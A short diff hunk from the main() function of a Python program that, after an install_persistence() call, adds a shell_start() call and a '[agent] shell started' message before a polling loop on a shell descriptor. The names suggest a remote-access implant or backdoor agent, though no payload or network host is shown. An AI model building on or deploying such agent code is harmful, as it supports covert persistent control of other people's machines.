@@ -521,6 +521,9 @@ def main():
     if not no_install:
         install_persistence()
 
+    shell_start()
+    print("[agent] shell started")
+
     poll_count = 0
     while True:
         if SH_FD is not None:
